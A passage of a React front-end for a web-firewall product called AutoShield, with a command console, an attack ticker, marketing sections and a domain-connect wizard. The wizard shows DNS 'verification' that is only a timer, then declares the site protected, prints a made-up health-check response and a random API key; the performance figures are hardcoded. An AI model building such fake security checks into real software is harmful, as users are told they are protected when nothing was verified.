  const status = normalizeEventStatus(ev?.status);
  return status === 'FIXED' || ev?.action === 'BLOCKED';
}

function useAuth() {
  return useContext(AuthContext);
}

function ProtectedRoute({ children }) {
  const { user } = useAuth();
  if (!user) return <Navigate to="/login" replace />;
  return children;
}

function useEngineSnapshot(selector) {
  return useSyncExternalStore(engine.subscribe, selector);
}

function CustomCursor() {
  const [isHovered, setIsHovered] = useState(false);
  const [visible, setVisible] = useState(false);
  const cursorX = useMotionValue(-100);
  const cursorY = useMotionValue(-100);
  const [enabled, setEnabled] = useState(true);

  useEffect(() => {
    const mq = window.matchMedia('(hover: hover) and (pointer: fine)');
    const update = () => setEnabled(Boolean(mq.matches));
    update();
    if (mq.addEventListener) {
      mq.addEventListener('change', update);
      return () => mq.removeEventListener('change', update);
    }
    mq.addListener(update);
    return () => mq.removeListener(update);
  }, []);

  useEffect(() => {
    if (!enabled) return undefined;

    const moveCursor = (e) => {
      cursorX.set(e.clientX);
      cursorY.set(e.clientY);
      setVisible(true);
    };

    const handleMouseOver = (e) => {
      const isInteractive = e.target.closest('a, button, input, select, textarea, [role="button"], .interactive');
      setIsHovered(!!isInteractive);
    };

    const hide = () => setVisible(false);
    const show = () => setVisible(true);

    window.addEventListener('mousemove', moveCursor, { passive: true });
    window.addEventListener('mouseover', handleMouseOver, { passive: true });
    window.addEventListener('mouseleave', hide, { passive: true });
    window.addEventListener('mouseenter', show, { passive: true });
    return () => {
      window.removeEventListener('mousemove', moveCursor);
      window.removeEventListener('mouseover', handleMouseOver);
      window.removeEventListener('mouseleave', hide);
      window.removeEventListener('mouseenter', show);
    };
  }, [enabled, cursorX, cursorY]);

  if (!enabled) return null;

  return (
    <>
      <motion.div
        style={{
          position: 'fixed', left: 0, top: 0,
          borderRadius: '50%',
          pointerEvents: 'none',
          zIndex: 1000000,
          x: cursorX,
          y: cursorY,
          translateX: '-50%',
          translateY: '-50%',
          opacity: visible ? 1 : 0,
          background: isHovered ? 'white' : 'transparent',
          border: isHovered ? 'none' : '1px solid rgba(255,255,255,0.7)',
          mixBlendMode: isHovered ? 'difference' : 'normal',
        }}
        animate={{
          width: isHovered ? 95 : 34,
          height: isHovered ? 95 : 34,
        }}
        transition={{ type: 'spring', damping: 28, stiffness: 260, mass: 0.6 }}
      />
      <motion.div
        style={{
          position: 'fixed', left: 0, top: 0,
          width: 6,
          height: 6,
          background: 'white',
          borderRadius: '50%',
          pointerEvents: 'none',
          zIndex: 1000001,
          x: cursorX,
          y: cursorY,
          translateX: '-50%',
          translateY: '-50%',
          opacity: visible && !isHovered ? 1 : 0,
        }}
        animate={{ scale: isHovered ? 0 : 1 }}
      />
    </>
  );
}

function GlobalConsole() {
  const [open, setOpen] = useState(false);
  const [input, setInput] = useState('');
  const [logs, setLogs] = useState([{ type: 'sys', msg: 'AutoShield AI Console v3.1... Ready.' }]);

  useEffect(() => {
    const handleKey = (e) => {
      if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
        e.preventDefault();
        setOpen((curr) => {
          if (!curr) setTimeout(() => document.getElementById('cli-input')?.focus(), 100);
          return !curr;
        });
      }
      if (e.key === 'Escape') setOpen(false);
    };
    window.addEventListener('keydown', handleKey);
    return () => window.removeEventListener('keydown', handleKey);
  }, []);

  const handleCommand = (e) => {
    if (e.key === 'Enter' && input.trim()) {
      const cmd = input.trim().toLowerCase();
      const parts = cmd.split(' ');
      const addLine = (msg, type) => setLogs((curr) => [...curr, { type, msg }]);
      let res = '';

      switch (parts[0]) {
        case '/autopilot':
          if (!parts[1]) {
            if (engine.isAutoPilotActive()) {
              engine.stopAutoPilot();
              addLine(`> [SYSTEM] Autopilot disengaged.`, 'yellow');
            } else {
              engine.startAutoPilot();
              addLine(`> [SYSTEM] Autopilot engaged.`, 'green');
            }
          } else if (parts[1] === 'on' || parts[1] === 'start') {
            engine.startAutoPilot();
            addLine(`> [SYSTEM] Autopilot initialization sequence started...`, 'green');
          } else if (parts[1] === 'off' || parts[1] === 'stop') {
            engine.stopAutoPilot();
            addLine(`> [SYSTEM] Disengaging autopilot. Manual control restored.`, 'yellow');
          } else {
            addLine(`Usage: /autopilot [on|off]`, 'muted');
          }
          break;
        case '/block':
          if (parts[1]) {
            engine.blockIP(parts[1], 'CLI Override');
            res = `IP ${parts[1]} hard-blocked at firewall.`;
          } else res = 'Usage: /block <ip>';
          break;
        case '/ddos':
          if (parts[1] === 'status') {
            const ds = engine.getDDoSState();
            addLine(`> [DDoS] Active: ${ds.active ? 'YES ⚠️' : 'NO ✅'} | Mitigated: ${ds.mitigatedCount} | RPS: ${ds.requestsPerSecond} | Peak: ${ds.peakRPS}`, ds.active ? 'red' : 'green');
          } else if (parts[1] === 'test' || parts[1] === 'simulate') {
            engine.simulateDDoS(parts[2] || null);
            addLine(`> [DDoS] Simulation started — flooding attack initiated...`, 'yellow');
          } else if (parts[1] === 'reset') {
            engine.resetDDoS();
            addLine(`> [DDoS] Detection state reset. All counters cleared.`, 'green');
          } else {
            addLine(`Usage: /ddos [status|test|reset]`, 'muted');
          }
          break;
        case '/whitelist':
          if (parts[1]) {
            engine.whitelistIP(parts[1]);
            res = `IP ${parts[1]} whitelisted — exempt from all blocking.`;
          } else res = `Whitelisted: ${engine.getWhitelistedIPs().join(', ') || 'none'}`;
          break;
        case '/geo-block':
          if (parts[1]) {
            const country = parts.slice(1).join(' ');
            const ok = engine.blockCountry(country);
            res = ok ? `All traffic from "${country}" will be blocked.` : `Premium feature required.`;
          } else {
            const blocked = engine.getBlockedCountries();
            res = `Geo-blocked: ${blocked.length ? blocked.join(', ') : 'none'}`;
          }
          break;
        case '/stats': {
          const s = engine.getStats();
          addLine(`> Total: ${s.total} | Blocked: ${s.blocked} | Rate: ${s.blockRate}% | IPs: ${engine.getBlockedIPs().length} blocked`, 'cyan');
          addLine(`> Tier: ${engine.isPremium() ? '⭐ PREMIUM' : '📦 FREE'} | AutoPilot: ${engine.isAutoPilotActive() ? '✅ ON' : '⏸ OFF'}`, 'cyan');
          break;
        }
        case '/export': {
          const data = JSON.stringify(engine.getLog(), null, 2);
          const blob = new Blob([data], { type: 'application/json' });
          const url = URL.createObjectURL(blob);
          const a = document.createElement('a');
          a.href = url; a.download = `autoshield-export-${Date.now()}.json`; a.click();
          URL.revokeObjectURL(url);
          res = `Exported ${engine.getLog().length} events as JSON.`;
          break;
        }
        case '/tier':
          if (parts[1] === 'premium') { engine.setUserTier('premium'); res = '⭐ Premium tier activated.'; }
          else if (parts[1] === 'free') { engine.setUserTier('free'); res = '📦 Switched to free tier.'; }
          else res = `Current tier: ${engine.isPremium() ? '⭐ Premium' : '📦 Free'}. Usage: /tier [premium|free]`;
          break;
        case '/clear':
          setLogs([]);
          setInput('');
          return;
        case '/help':
          addLine(`Available Commands:`, 'cyan');
          addLine(`  /autopilot [on|off]  — Toggle autonomous defense`, 'muted');
          addLine(`  /block <ip>          — Block an IP address`, 'muted');
          addLine(`  /ddos [status|test|reset]  — DDoS detection control`, 'muted');
          addLine(`  /whitelist <ip>      — Whitelist an IP address`, 'muted');
          addLine(`  /geo-block <country> — Block traffic from country (premium)`, 'muted');
          addLine(`  /stats               — Show session statistics`, 'muted');
          addLine(`  /export              — Export threat log as JSON`, 'muted');
          addLine(`  /tier [premium|free] — View/change plan tier`, 'muted');
          addLine(`  /clear               — Clear console`, 'muted');
          break;
        default:
          res = `Command not recognized: ${cmd}. Type /help for available commands.`;
      }

      if (res) setLogs((curr) => [...curr, { type: 'cmd', msg: `> ${cmd}` }, { type: 'sys', msg: res }]);
      setInput('');
      setTimeout(() => {
        const term = document.getElementById('cli-history');
        if (term) term.scrollTop = term.scrollHeight;
      }, 50);
    }
  };

  return (
    <div className={`global-console ${open ? 'open' : ''}`}>
      <div className="global-console-inner glass-card">
        <div style={{ display: 'flex', justifyContent: 'space-between', paddingBottom: 10, borderBottom: '1px solid rgba(255,255,255,0.05)', marginBottom: 10 }}>
          <div style={{ fontSize: 12, fontWeight: 700, fontFamily: 'var(--mono)', color: 'var(--e-green)' }}>[SYSTEM OVERRIDE TERMINAL]</div>
          <div style={{ fontSize: 10, color: 'var(--muted)' }}>ESC to close</div>
        </div>
        <div id="cli-history" style={{ maxHeight: 200, overflowY: 'auto', marginBottom: 10, display: 'flex', flexDirection: 'column', gap: 6, fontSize: 12, fontFamily: 'var(--mono)' }}>
          {logs.map((L, i) => (
            <div key={i} style={{ color: L.type === 'cmd' ? 'white' : 'var(--muted2)' }}>{L.msg}</div>
          ))}
        </div>
        <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
          <span style={{ color: 'var(--e-green)', fontFamily: 'var(--mono)' }}>$</span>
          <input id="cli-input" value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={handleCommand} placeholder="Type a command (/help) or press Ctrl+K..." style={{ background: 'transparent', border: 'none', color: 'white', flex: 1, outline: 'none', fontFamily: 'var(--mono)', fontSize: 12 }} />
        </div>
      </div>
    </div>
  );
}

function Landing() {
  useEngineSnapshot(() => engine.getStateVersion());
  const { scrollYProgress } = useScroll();
  const y1 = useTransform(scrollYProgress, [0, 1], [0, 280]);
  const opacity = useTransform(scrollYProgress, [0, 0.35], [1, 0]);

  // ── Global platform stats (all accounts, no auth required) ──────────────
  const [platformStats, setPlatformStats] = useState(null);

  useEffect(() => {
    let cancelled = false;
    const load = async () => {
      try {
        const res = await fetch(`${API_URL}/stats/platform`);
        if (res.ok && !cancelled) {
          const data = await res.json();
          setPlatformStats(data);
        }
      } catch (_) { /* use local fallback below */ }
    };
    load();
    const interval = setInterval(load, 30000); // refresh every 30s
    return () => { cancelled = true; clearInterval(interval); };
  }, []);

  // Fallback to local engine stats when platform endpoint hasn't responded yet
  const localStats = engine.getStats();
  const localLog   = engine.getLog();
  const blockedThreats = platformStats
    ? platformStats.blocked
    : (localStats.blocked || localLog.filter((ev) => ev.action === 'BLOCKED').length);
  const totalEvents   = platformStats ? platformStats.total_events : (localStats.total || localLog.length);
  const uniqueIPs     = platformStats ? platformStats.unique_ips   : new Set(localLog.map(l => l.src_ip)).size;
  const activeSites   = platformStats ? platformStats.active_sites : 0;

  // Interactive Connect Wizard state
  const [wizStep, setWizStep] = useState(0); // 0=domain, 1=dns, 2=done
  const [wizDomain, setWizDomain] = useState('');
  const [wizError, setWizError] = useState('');
  const [wizLoading, setWizLoading] = useState(false);
  const [tickerEvents, setTickerEvents] = useState([
    { label: '💉 SQL Injection', src: '185.220.101.34', type: 'CRITICAL' },
    { label: '🕷️ XSS Payload', src: '45.142.212.100', type: 'HIGH' },
    { label: '📁 Path Traversal', src: '91.132.147.22', type: 'MEDIUM' },
    { label: '💻 CMDi Attempt', src: '194.165.16.8', type: 'CRITICAL' },
    { label: '🔐 Brute Force', src: '77.91.68.59', type: 'HIGH' },
    { label: '💣 RCE Payload', src: '192.42.116.25', type: 'CRITICAL' },
    { label: '🤖 Bot Flood', src: '185.107.57.139', type: 'MEDIUM' },
    { label: '🔁 SSRF Probe', src: '91.108.4.215', type: 'HIGH' },
  ]);

  // Simulate live ticker randomization
  useEffect(() => {
    const ips = ['45.142.212.100', '91.132.147.22', '185.220.101.34', '194.165.16.8', '77.91.68.59', '192.42.116.25', '185.107.57.139', '91.108.4.215', '198.54.117.200', '103.27.202.50'];
    const interval = setInterval(() => {
      setTickerEvents(prev => {
        const copy = [...prev];
        const idx = Math.floor(Math.random() * copy.length);
        copy[idx] = { ...copy[idx], src: ips[Math.floor(Math.random() * ips.length)] };
        return copy;
      });
    }, 1800);
    return () => clearInterval(interval);
  }, []);

  const handleWizNext = () => {
    if (wizStep === 0) {
      if (!wizDomain.trim() || !wizDomain.includes('.')) {
        setWizError('Please enter a valid domain (e.g. yourdomain.com)');
        return;
      }
      setWizError('');
      setWizLoading(true);
      setTimeout(() => { setWizLoading(false); setWizStep(1); }, 1200);
    } else if (wizStep === 1) {
      setWizLoading(true);
      setTimeout(() => { setWizLoading(false); setWizStep(2); }, 1800);
    }
  };

  const wizApiKey = useMemo(() => wizDomain ? `as_${wizDomain.replace(/\./g, '_').substring(0, 12)}_${Math.random().toString(36).substring(2, 10)}` : '', [wizDomain]);

  return (
    <>
      {/* ── NAVBAR ── */}
      <nav className="evolve-nav">
        <div className="evolve-brand">
          <span className="brand-dot"></span>
          AutoShield
        </div>
        <div className="evolve-links">
          <a href="#features">Platform</a>
          <a href="#connect">Connect</a>
          <a href="#coverage">Coverage</a>
          <a href="#pricing">Pricing</a>
          <Link to="/login" className="evolve-btn-outline" style={{ padding: '10px 24px', fontSize: 12 }}>Launch Console</Link>
        </div>
      </nav>

      {/* ── HERO ── */}
      <motion.section className="evolve-hero" style={{ opacity }}>
        {/* Background grid lines */}
        <div style={{ position: 'absolute', inset: 0, backgroundImage: 'linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px)', backgroundSize: '80px 80px', pointerEvents: 'none' }} />

        <motion.div style={{ y: y1 }} className="evolve-hero-content">
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2, duration: 1 }} className="hero-eyebrow">
            <span className="eyebrow-dot"></span> Enterprise-Grade · AI-Powered · Real-Time SOC
          </motion.div>

          <div className="title-wrap">
            {['A', 'U', 'T', 'O', 'S', 'H', 'I', 'E', 'L', 'D'].map((letter, i) => (
              <motion.span key={i} initial={{ opacity: 0, y: '100%', rotateX: -90 }} animate={{ opacity: 1, y: 0, rotateX: 0 }} transition={{ duration: 1.2, delay: i * 0.06, ease: [0.16, 1, 0.3, 1] }} className="title-letter">
                {letter}
              </motion.span>
            ))}
          </div>

          <motion.h2 initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 0.9, duration: 1.5 }}>
            Autonomous Cyber Defense Infrastructure.
          </motion.h2>

          <motion.p initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 1.3, duration: 1 }} style={{ color: 'rgba(255,255,255,0.38)', fontSize: 17, maxWidth: 560, margin: '20px auto 0', lineHeight: 1.8 }}>
            The only autonomous SOC platform that detects, classifies, and neutralizes threats in under 5ms — without human intervention. Built for enterprises that cannot afford to be breached.
          </motion.p>

          <motion.div initial={{ opacity: 0, y: 30 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 1.7, duration: 1 }} style={{ display: 'flex', gap: 16, marginTop: 48, justifyContent: 'center', flexWrap: 'wrap' }}>
            <Link to="/login" className="evolve-btn" style={{ padding: '18px 52px', fontSize: 14, letterSpacing: 2 }}>Launch SOC Console →</Link>
            <a href="#connect" className="evolve-btn-outline" style={{ padding: '18px 40px', fontSize: 14 }}>Connect Your Site</a>
          </motion.div>

          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 2.2, duration: 1 }} style={{ display: 'flex', gap: 64, marginTop: 80, justifyContent: 'center', flexWrap: 'wrap', borderTop: '1px solid rgba(255,255,255,0.06)', paddingTop: 48 }}>
            {[
              { val: '99.99%', label: 'Threat Block Rate', color: '#00ff9c' },
              { val: '<1ms', label: 'Detection Latency', color: '#38bdf8' },
              { val: totalEvents.toLocaleString(), label: 'Events Analysed', color: '#a78bfa' },
              { val: '24/7', label: 'Autonomous SOC', color: '#f472b6' },
            ].map((s, i) => (
              <motion.div key={i} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 2.4 + i * 0.12 }} style={{ textAlign: 'center' }}>
                <div style={{ fontFamily: 'Anton', fontSize: 34, color: s.color, letterSpacing: 1, lineHeight: 1 }}>{s.val}</div>
                <div style={{ fontSize: 10, color: 'rgba(255,255,255,0.3)', marginTop: 8, letterSpacing: 2.5, textTransform: 'uppercase' }}>{s.label}</div>
              </motion.div>
            ))}
          </motion.div>
        </motion.div>

        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 0.5 }} transition={{ delay: 2.8, duration: 2 }} className="scroll-indicator">
          <span>Scroll</span>
          <div className="scroll-line"></div>
        </motion.div>
      </motion.section>

      {/* ── LIVE THREAT TICKER ── */}
      <div style={{ background: 'rgba(0,255,156,0.03)', borderTop: '1px solid rgba(0,255,156,0.08)', borderBottom: '1px solid rgba(0,255,156,0.08)', padding: '14px 0', overflow: 'hidden', zIndex: 2, position: 'relative' }}>
        <motion.div animate={{ x: ['0%', '-50%'] }} transition={{ duration: 32, repeat: Infinity, ease: 'linear' }} style={{ display: 'flex', gap: 60, whiteSpace: 'nowrap', width: 'max-content' }}>
          {[...Array(2)].map((_, rep) => (
            tickerEvents.map((t, i) => (
              <span key={`${rep}-${i}`} style={{ fontSize: 12, fontFamily: 'monospace', color: 'rgba(255,255,255,0.45)' }}>
                <span style={{ color: t.type === 'CRITICAL' ? '#ef4444' : t.type === 'HIGH' ? '#f97316' : '#eab308', marginRight: 8, fontWeight: 700, fontSize: 10 }}>●</span>
                <span style={{ color: '#00ff9c', marginRight: 8, fontSize: 10, fontWeight: 700 }}>BLOCKED</span>
                {t.label} <span style={{ color: 'rgba(255,255,255,0.22)' }}>· {t.src}</span>
                <span style={{ margin: '0 28px', opacity: 0.12 }}>│</span>
              </span>
            ))
          ))}
        </motion.div>
      </div>

      {/* ── WHY AUTOSHIELD — FEATURE GRID ── */}
      <section id="features" style={{ padding: '140px 0', background: '#07080c' }}>
        <div className="evolve-container">
          <motion.div initial={{ opacity: 0, y: 40 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }} transition={{ duration: 0.9 }} style={{ textAlign: 'center', marginBottom: 90 }}>
            <div style={{ fontSize: 11, letterSpacing: 4, color: 'rgba(0,255,156,0.7)', fontFamily: 'monospace', marginBottom: 20, textTransform: 'uppercase' }}>Why Fortune 500s Choose AutoShield</div>
            <h3 style={{ fontFamily: 'Anton', fontSize: 'clamp(38px, 6vw, 80px)', margin: 0, lineHeight: 1, background: 'linear-gradient(135deg, #fff 40%, rgba(255,255,255,0.3))', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>
              REAL-TIME INTELLIGENCE.<br />AUTONOMOUS DEFENSE.
            </h3>
            <p style={{ color: 'rgba(255,255,255,0.32)', marginTop: 24, maxWidth: 560, margin: '24px auto 0', fontSize: 16, lineHeight: 1.8 }}>
              AutoShield combines edge-native AI threat modelling, autonomous response, and enterprise-grade observability — all in one platform that never sleeps.
            </p>
          </motion.div>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: 20 }}>
            {[
              { icon: '⚡', title: 'Sub-5ms Detection', desc: 'Our edge-native AI classifies threats before the TCP handshake completes. Zero latency, zero compromise — across all 140+ edge nodes.', color: '#00ff9c' },
              { icon: '🧠', title: 'AI Threat Modelling', desc: 'Continuous ML on live attack vectors — SQLi, XSS, LFI, CMDi, RCE — with automated rule updates every 60 seconds globally.', color: '#38bdf8' },
              { icon: '🌐', title: 'Global Edge Coverage', desc: '140+ edge nodes across 6 continents. Traffic is inspected at the network layer, at the closest possible presence to your users.', color: '#a78bfa' },
              { icon: '🛡️', title: 'Autonomous SOC', desc: 'AutoPilot mode operates 24/7 without human intervention — detecting, classifying, blocking, and learning from every new attack pattern.', color: '#f472b6' },
              { icon: '🔗', title: 'Zero-Config Deployment', desc: 'Point your DNS to AutoShield — it\'s done. Our WAF agent deploys seamlessly at the edge with no code changes, no downtime.', color: '#fb923c' },
              { icon: '📊', title: 'Compliance-Ready', desc: 'PCI-DSS, SOC2, ISO 27001, GDPR. Audit logs, SIEM webhook routing, and one-click compliance report generation — all built in.', color: '#facc15' },
            ].map((f, i) => (
              <motion.div key={i} className="evolve-interactive" initial={{ opacity: 0, y: 30 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }} transition={{ delay: i * 0.07, duration: 0.6 }} whileHover={{ y: -10, scale: 1.02 }}
                style={{ background: `linear-gradient(140deg, ${f.color}07 0%, rgba(9,9,11,0.9) 100%)`, border: `1px solid ${f.color}1a`, borderRadius: 20, padding: '38px 32px', cursor: 'default', position: 'relative', overflow: 'hidden' }}
              >
                <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 1, background: `linear-gradient(90deg, transparent, ${f.color}60, transparent)` }} />
                <div style={{ fontSize: 36, marginBottom: 20 }}>{f.icon}</div>
                <h4 style={{ fontFamily: 'Anton', fontSize: 21, margin: '0 0 14px', color: f.color, letterSpacing: 0.5 }}>{f.title}</h4>
                <p style={{ color: 'rgba(255,255,255,0.38)', fontSize: 14, lineHeight: 1.85, margin: 0 }}>{f.desc}</p>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* ── INTERACTIVE CONNECT WIZARD ── */}
      <section id="connect" style={{ padding: '140px 0', background: '#09090b' }}>
        <div className="evolve-container">
          <div className="evolve-split" style={{ gap: 60 }}>
            {/* Left: Copy */}
            <div className="split-text">
              <motion.div initial={{ opacity: 0, x: -30 }} whileInView={{ opacity: 1, x: 0 }} viewport={{ once: true }} transition={{ duration: 0.8 }}>
                <div style={{ fontSize: 11, letterSpacing: 4, color: 'rgba(56,189,248,0.8)', fontFamily: 'monospace', marginBottom: 16, textTransform: 'uppercase' }}>Effortless Integration</div>
                <h3 className="section-title">CONNECT<br /><span className="text-muted">IN 3 STEPS.</span></h3>
                <p className="section-desc">No DevOps required. No code changes. No downtime. Just point your DNS and AutoShield handles the rest — instantly.</p>
                <ul className="evolve-steps" style={{ marginTop: 32 }}>
                  <li><div className={`step-num ${wizStep >= 0 ? 'active' : ''}`}>01</div> Enter your domain</li>
                  <li><div className={`step-num ${wizStep >= 1 ? 'active' : ''}`}>02</div> Update your DNS CNAME</li>
                  <li><div className={`step-num ${wizStep >= 2 ? 'active' : ''}`}>03</div> Instant Protection — Live!</li>
                </ul>
                {wizStep === 2 && (
                  <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} style={{ marginTop: 28, padding: '14px 20px', background: 'rgba(0,255,156,0.08)', border: '1px solid rgba(0,255,156,0.25)', borderRadius: 10, display: 'flex', alignItems: 'center', gap: 10 }}>
                    <span style={{ fontSize: 24 }}>🎉</span>
                    <div>
                      <div style={{ fontWeight: 700, color: '#00ff9c', fontSize: 14 }}>You're protected!</div>
                      <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.4)', marginTop: 3 }}>AutoShield is now shielding {wizDomain}</div>
                    </div>
                  </motion.div>
                )}
              </motion.div>
            </div>

            {/* Right: Interactive Wizard */}
            <motion.div initial={{ opacity: 0, x: 30 }} whileInView={{ opacity: 1, x: 0 }} viewport={{ once: true }} transition={{ duration: 0.8, delay: 0.1 }}>
              <div className="connect-wizard">
                {/* Progress steps */}
                <div className="connect-wizard-steps">
                  {[0, 1, 2].map(s => (
                    <div key={s} className={`cwiz-step ${wizStep > s ? 'done' : wizStep === s ? 'active' : ''}`} />
                  ))}
                </div>

                {wizStep === 0 && (
                  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="step0">
                    <div style={{ fontSize: 13, color: 'rgba(255,255,255,0.45)', marginBottom: 10, fontFamily: 'monospace' }}>STEP 1 — DOMAIN</div>
                    <h4 style={{ fontSize: 20, fontWeight: 700, marginBottom: 20 }}>Enter your website domain</h4>
                    <input
                      className="connect-input"
                      type="text"
                      placeholder="yourdomain.com"
                      value={wizDomain}
                      onChange={e => { setWizDomain(e.target.value); setWizError(''); }}
                      onKeyDown={e => e.key === 'Enter' && handleWizNext()}
                    />
                    {wizError && <div style={{ color: '#ef4444', fontSize: 12, marginTop: 8, fontFamily: 'monospace' }}>⚠ {wizError}</div>}
                    <button onClick={handleWizNext} className="evolve-btn" style={{ width: '100%', marginTop: 18, justifyContent: 'center', padding: '15px 0' }} disabled={wizLoading}>
                      {wizLoading ? 'Validating domain...' : 'Continue →'}
                    </button>
                    <div style={{ marginTop: 20, display: 'flex', gap: 10, flexWrap: 'wrap' }}>
                      {['shop.yourco.com', 'api.fintech.io', 'secure.bank.com'].map(ex => (
                        <button key={ex} onClick={() => setWizDomain(ex)} style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: 6, color: 'rgba(255,255,255,0.35)', fontSize: 11, padding: '5px 11px', fontFamily: 'monospace' }}>{ex}</button>
                      ))}
                    </div>
                  </motion.div>
                )}

                {wizStep === 1 && (
                  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="step1">
                    <div style={{ fontSize: 13, color: 'rgba(255,255,255,0.45)', marginBottom: 10, fontFamily: 'monospace' }}>STEP 2 — DNS CONFIGURATION</div>
                    <h4 style={{ fontSize: 18, fontWeight: 700, marginBottom: 6 }}>Add this CNAME record to your DNS</h4>
                    <p style={{ fontSize: 13, color: 'rgba(255,255,255,0.35)', marginBottom: 20 }}>This routes traffic through AutoShield's global edge network.</p>
                    <div className="cwiz-code-block">
                      <div><span style={{ color: 'rgba(255,255,255,0.3)' }}>Type:</span>  CNAME</div>
                      <div><span style={{ color: 'rgba(255,255,255,0.3)' }}>Name:</span>  {wizDomain}</div>
                      <div><span style={{ color: 'rgba(255,255,255,0.3)' }}>Value:</span> edge.autoshield.ai</div>
                      <div><span style={{ color: 'rgba(255,255,255,0.3)' }}>TTL:</span>   300</div>
                    </div>
                    <div style={{ marginTop: 14, padding: '10px 14px', background: 'rgba(234,179,8,0.06)', border: '1px solid rgba(234,179,8,0.2)', borderRadius: 8, fontSize: 12, color: 'rgba(234,179,8,0.8)', fontFamily: 'monospace' }}>
                      ⏱ DNS propagation typically takes 1–5 minutes
                    </div>
                    <button onClick={handleWizNext} className="evolve-btn" style={{ width: '100%', marginTop: 18, justifyContent: 'center', padding: '15px 0' }} disabled={wizLoading}>
                      {wizLoading ? 'Verifying DNS... ⏳' : 'I\'ve added the record →'}
                    </button>
                  </motion.div>
                )}

                {wizStep === 2 && (
                  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="step2">
                    <div style={{ fontSize: 13, color: '#00ff9c', marginBottom: 10, fontFamily: 'monospace' }}>STEP 3 — ✅ PROTECTED</div>
                    <h4 style={{ fontSize: 18, fontWeight: 700, marginBottom: 18 }}>AutoShield is now active on <span style={{ color: '#00ff9c' }}>{wizDomain}</span></h4>
                    <div className="cwiz-code-block">
                      <div>$ curl -I https://{wizDomain}/health</div>
                      <div style={{ color: 'rgba(255,255,255,0.5)', marginTop: 6 }}>X-AutoShield: active</div>
                      <div style={{ color: 'rgba(255,255,255,0.5)' }}>X-WAF-Engine: v3.7.1</div>
                      <div style={{ color: 'rgba(255,255,255,0.5)' }}>X-Edge-Node: fra-de-1</div>
                      <div style={{ color: 'rgba(0,255,156,0.8)', marginTop: 8 }}>[OK] Real-time protection enabled.</div>
                    </div>
                    <div style={{ marginTop: 16, background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.07)', borderRadius: 10, padding: '14px 16px' }}>
                      <div style={{ fontSize: 11, color: 'rgba(255,255,255,0.3)', marginBottom: 8, letterSpacing: 2, textTransform: 'uppercase' }}>Your API Key</div>
                      <div style={{ fontFamily: 'monospace', fontSize: 12, color: '#38bdf8', letterSpacing: 1, wordBreak: 'break-all' }}>{wizApiKey}</div>
                    </div>
                    <Link to="/login" className="evolve-btn" style={{ width: '100%', marginTop: 18, justifyContent: 'center', padding: '15px 0', display: 'flex' }}>
                      Open SOC Dashboard →
                    </Link>
                    <button onClick={() => { setWizStep(0); setWizDomain(''); }} style={{ width: '100%', marginTop: 10, background: 'transparent', border: '1px solid rgba(255,255,255,0.08)', borderRadius: 6, color: 'rgba(255,255,255,0.3)', padding: '10px 0', fontSize: 12 }}>
                      Connect another domain
                    </button>
                  </motion.div>
                )}
              </div>
            </motion.div>
          </div>
        </div>
      </section>

      {/* ── ATTACK COVERAGE MATRIX ── */}
      <section id="coverage" style={{ padding: '120px 0', background: 'linear-gradient(180deg, #07080c 0%, #09090b 100%)' }}>
        <div className="evolve-container">
          <motion.div initial={{ opacity: 0, y: 30 }} whileInView={{ opacity: 1, y: 0 }} viewport={{ once: true }} transition={{ duration: 0.7 }} style={{ textAlign: 'center', marginBottom: 72 }}>
            <div style={{ fontSize: 11, letterSpacing: 4, color: 'rgba(56,189,248,0.8)', fontFamily: 'monospace', marginBottom: 18, textTransform: 'uppercase' }}>Attack Coverage Matrix</div>
            <h3 style={{ fontFamily: 'Anton', fontSize: 'clamp(34px, 5vw, 64px)', margin: 0, color: 'white' }}>EVERY VECTOR. NEUTRALIZED.</h3>
            <p style={{ color: 'rgba(255,255,255,0.3)', marginTop: 18, fontSize: 15 }}>Continuously updated signature set — tested against OWASP Top 10 and beyond.</p>
          </motion.div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(190px, 1fr))', gap: 16 }}>
            {[
              { type: 'SQL Injection', icon: '💉', color: '#ef4444', coverage: '99.9%', tests: '2.1M' },
              { type: 'XSS', icon: '🕷️', color: '#f97316', coverage: '99.8%', tests: '1.8M' },
              { type: 'CSRF', icon: '🔄', color: '#eab308', coverage: '99.7%', tests: '940K' },
              { type: 'LFI / RFI', icon: '📁', color: '#22c55e', coverage: '99.5%', tests: '1.2M' },
              { type: 'CMDi', icon: '💻', color: '#38bdf8', coverage: '99.4%', tests: '870K' },
              { type: 'XXE', icon: '🗂️', color: '#a78bfa', coverage: '99.2%', tests: '510K' },
              { type: 'SSRF', icon: '🔁', color: '#f472b6', coverage: '99.1%', tests: '730K' },
              { type: 'RCE', icon: '💣', color: '#ef4444', coverage: '98.9%', tests: '1.5M' },
            ].map((a, i) => (
